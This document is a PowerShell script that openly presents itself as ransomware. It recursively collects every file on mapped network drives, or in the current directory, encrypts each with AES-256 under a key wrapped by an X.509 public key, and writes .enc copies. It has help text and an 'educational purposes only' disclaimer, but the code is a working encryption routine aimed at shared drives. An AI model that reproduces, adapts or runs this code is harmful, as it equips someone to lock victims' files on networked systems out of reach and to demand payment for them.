<#
PowerShell Ransomware Script with Modes
.Description
This script encrypts files using an X.509 public key certificate.
It supports two modes:
1. Default Mode (--Mode default): Encrypts files on mapped network drives.
2. Custom Mode (--Mode custom): Encrypts files in the current working directory.
3. Help Mode (--Mode help): Displays usage instructions.

.Instructions
- Provide the thumbprint of a valid X.509 certificate.
- Use "--Mode default", "--Mode custom", or "--Mode help" to specify the mode during execution.

.Notes
This script is for educational purposes only and should not be used maliciously.
#>

# Parameter Parsing
param (
    [string]$Mode = "default"  # Default execution mode
)

# Help Option
if ($Mode -eq "help") {
    Write-Host "Usage: .\ransom.ps1 --Mode <mode>"
    Write-Host "Modes:"
    Write-Host "  default : Encrypts files on mapped network drives."
    Write-Host "  custom  : Encrypts files in the current working directory."
    Write-Host "  help    : Displays this help message."
    Exit
}

# Check parameter value
if ($Mode -eq "default") {
    Write-Host "Running in default mode: Targeting network drives."
} elseif ($Mode -eq "custom") {
    Write-Host "Running in custom mode: Encrypting files in the current directory."
} else {
    Write-Error "Invalid mode specified. Use '--Mode help' for usage instructions."
    Exit
}

# Define the certificate for encryption
$Cert = $(Get-ChildItem Cert:\CurrentUser\My\THUMBPRINTGOESHERE)
if (-not $Cert) {
    Write-Error "Certificate not found. Please provide a valid certificate thumbprint."
    Exit
}

# File enumeration based on mode
if ($Mode -eq "default") {
    # Enumerate network drives
    $psdrives = Get-PSDrive | Where-Object { $_.DriveType -eq "Network" } | Select-Object -ExpandProperty Root
    $FileToEncrypt = foreach ($drive in $psdrives) {
        Get-ChildItem -Path $drive -Recurse -Force | Where-Object { -not $_.PSIsContainer } -ErrorAction SilentlyContinue
    }
} elseif ($Mode -eq "custom") {
    # Encrypt files in the current directory
    $currentDir = Get-Location
    $FileToEncrypt = Get-ChildItem -Path $currentDir.Path -Recurse -Force | Where-Object { -not $_.PSIsContainer }
} else {
    Write-Error "Unhandled mode. Exiting."
    Exit
}

# Encryption and file stream function
Function Encrypt-File {
    Param(
        [Parameter(Mandatory = $true)][System.IO.FileInfo]$FileToEncrypt,
        [Parameter(Mandatory = $true)][System.Security.Cryptography.X509Certificates.X509Certificate2]$Cert
    )

    Try { [System.Reflection.Assembly]::LoadWithPartialName("System.Security.Cryptography") } Catch {
        Write-Error "Could not load required assembly."; Return
    }

    $AesProvider = New-Object System.Security.Cryptography.AesManaged
    $AesProvider.KeySize = 256
    $AesProvider.BlockSize = 128
    $AesProvider.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $KeyFormatter = New-Object System.Security.Cryptography.RSAPKCS1KeyExchangeFormatter($Cert.PublicKey.Key)
    [Byte[]]$KeyEncrypted = $KeyFormatter.CreateKeyExchange($AesProvider.Key, $AesProvider.GetType())
    [Byte[]]$LenKey = [System.BitConverter]::GetBytes($KeyEncrypted.Length)
    [Byte[]]$LenIV = [System.BitConverter]::GetBytes($AesProvider.IV.Length)

    Try {
        $FileStreamWriter = New-Object System.IO.FileStream("$($env:temp+$FileToEncrypt.Name)", [System.IO.FileMode]::Create)
    } Catch {
        Write-Error "Unable to open output file for writing."; Return
    }

    $FileStreamWriter.Write($LenKey, 0, 4)
    $FileStreamWriter.Write($LenIV, 0, 4)
    $FileStreamWriter.Write($KeyEncrypted, 0, $KeyEncrypted.Length)
    $FileStreamWriter.Write($AesProvider.IV, 0, $AesProvider.IV.Length)
    $Transform = $AesProvider.CreateEncryptor()
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($FileStreamWriter, $Transform, [System.Security.Cryptography.CryptoStreamMode]::Write)

    Try {
        $FileStreamReader = New-Object System.IO.FileStream("$($FileToEncrypt.FullName)", [System.IO.FileMode]::Open)
    } Catch {
        Write-Error "Unable to open input file for reading."; Return
    }

    [Byte[]]$Data = New-Object Byte[] ($AesProvider.BlockSize / 8)
    [Int]$BytesRead = 0

    Do {
        $BytesRead = $FileStreamReader.Read($Data, 0, $Data.Length)
        $CryptoStream.Write($Data, 0, $BytesRead)
    } While ($BytesRead -gt 0)

    $CryptoStream.FlushFinalBlock()
    $CryptoStream.Close()
    $FileStreamReader.Close()
    $FileStreamWriter.Close()

    Copy-Item -Path "$($env:temp+$FileToEncrypt.Name)" -Destination "$($FileToEncrypt.FullName).enc" -Force
}

# Encrypt files in the list
foreach ($file in $FileToEncrypt) {
    Write-Host "Encrypting $file"
    Encrypt-File -FileToEncrypt $file -Cert $Cert -ErrorAction SilentlyContinue
}

Write-Host "Encryption process completed."
Exit
